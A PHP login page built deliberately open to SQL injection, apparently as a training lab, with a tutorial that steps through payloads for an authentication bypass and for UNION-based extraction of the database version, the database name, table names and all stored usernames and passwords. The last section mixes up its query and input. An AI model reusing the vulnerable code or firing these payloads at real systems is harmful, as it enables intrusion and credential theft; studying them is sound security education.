<?php
include '../includes/db.php';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Vulnerable SQL query
    $sql = "SELECT id, username FROM users WHERE username='$username' AND password='$password'";
    echo "<p>Executed SQL query: $sql</p>";
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        echo "<h2>RESULT</h2>";
        while ($row = $result->fetch_assoc()) {
            echo "<p>ID: " . $row['id'] . " - Username: " . $row['username'] . "</p>";
        }
        echo "========================================================================";
    } else {
        echo "Invalid username or password.";
    }

    // Redirect to the same page to prevent resubmission
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}
?>
<form method="post">
    Username: <input type="text" name="username"><br>
    Password: <input type="password" name="password"><br>
    <input type="submit" value="Login">
</form>

<h3>SQL INJECTION</h3>
<p>Check if we can login with this credential:</p>
<ol>
    <li>Input <code>admin' OR '1'='1</code> into the username input</li>
    <li>Input anything into the password field and try to login</li>
</ol>
<p>
    This happens because the programmer handles the login process like this with the query:
    <pre>
    $username = $_POST['username'];
    $password = $_POST['password'];

    $sql = "SELECT id, username FROM users WHERE username='$username' AND password='$password'";
    </pre>
    <br>
    If we input username <code>admin' OR '1'='1</code>, then the query will transform to:
    <pre>SELECT id, username FROM users WHERE username='admin' OR '1'='1' AND password='anything'</pre>
    The <code>OR '1'='1'</code> condition makes the query always true, thus allowing login 
    with any password.
</p>

<h3>ADVANCED SQL INJECTION GET DB TYPE AND VERSION</h3>
<p>Retrieve the RDBMS type and version:</p>
<ol>
    <li>Input <code>admin' UNION SELECT 1, @@version -- </code> (remember to add space at the end of the injection code) into the username input</li>
    <li>Input anything into the password field and try to login</li>
</ol>
<p>
    This happens because the programmer handles the login process like this with the query:
    <pre>
    $username = $_POST['username'];
    $password = $_POST['password'];

    $sql = "SELECT id, username FROM users WHERE username='$username' AND password='$password'";
    </pre>
    <br>
    If we input username <code>admin' UNION SELECT 1, @@version -- </code>, 
    then the query will transform to:
    <pre>SELECT id, username FROM users WHERE username='admin' UNION SELECT 1, @@version -- ' AND password='anything'</pre>
    The <code>UNION SELECT</code> statement allows us to combine the results of the original query with the RDBMS type and version.
    The <code>--</code> comment sequence comments out the rest of the original query, making the injected <code>UNION SELECT</code> statement valid.
</p>

<h3>ADVANCED SQL INJECTION GET DB NAME</h3>
<p>Retrieve the database name:</p>
<ol>
    <li>Input <code>admin' UNION SELECT 1, DATABASE() -- </code> (remember to add space at the end of the injection code) into the username input</li>
    <li>Input anything into the password field and try to login</li>
</ol>
<p>
    This happens because the programmer handles the login process like this with the query:
    <pre>
    $username = $_POST['username'];
    $password = $_POST['password'];

    $sql = "SELECT id, username FROM users WHERE username='$username' AND password='$password'";
    </pre>
    <br>
    If we input username <code>admin' UNION SELECT 1, DATABASE() -- </code>, 
    then the query will transform to:
    <pre>SELECT id, username FROM users WHERE username='admin' UNION SELECT 1, DATABASE() -- ' AND password='anything'</pre>
    The <code>UNION SELECT</code> statement allows us to combine the results of the original query with the database name.
    The <code>--</code> comment sequence comments out the rest of the original query, making the injected <code>UNION SELECT</code> statement valid.
</p>

<h3>ADVANCED SQL INJECTION GET TABLE NAMES</h3>
<p>Retrieve the table names from the database:</p>
<ol>
    <li>Input <code>admin' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = DATABASE() -- </code> into the username input</li>
    <li>Input anything into the password field and try to login</li>
</ol>
<p>
    This happens because the programmer handles the login process like this with the query:
    <pre>
    $username = $_POST['username'];
    $password = $_POST['password'];

    $sql = "SELECT id, username FROM users WHERE username='$username' AND password='$password'";
    </pre>
    <br>
    If we input username <code>admin' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = DATABASE() -- </code>, 
    then the query will transform to:
    <pre>SELECT id, username FROM users WHERE username='admin' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = DATABASE() -- ' AND password='anything'</pre>
    The <code>UNION SELECT</code> statement allows us to combine the results of the original query with the names of the tables in the current database.
    The <code>--</code> comment sequence comments out the rest of the original query, making the injected <code>UNION SELECT</code> statement valid.
</p>

<h3>ADVANCED SQL INJECTION GET ALL DATA IN 'users' TABLE</h3>
<p>Retrieve all data from the 'users' table:</p>
<ol>
    <li>Input <code>admin' UNION SELECT id, CONCAT(username,'-',password) as username FROM users -- </code> into the username input</li>
    <li>Input anything into the password field and try to login</li>
</ol>
<p>
    This happens because the programmer handles the login process like this with the query:
    <pre>
    $username = $_POST['username'];
    $password = $_POST['password'];

    $sql = "SELECT id, username, password FROM users WHERE username='$username' AND password='$password'";
    </pre>
    <br>
    If we input username <code>admin' UNION SELECT id, username FROM users -- </code>, 
    then the query will transform to:
    <pre>SELECT id, username FROM users WHERE username='admin' UNION SELECT id, CONCAT(username,'-',password) as username FROM users -- ' AND password='anything'</pre>
    The <code>UNION SELECT</code> statement allows us to combine the results of the original query with all data from the 'users' table.
    The <code>--</code> comment sequence comments out the rest of the original query, making the injected <code>UNION SELECT</code statement valid.
</p>
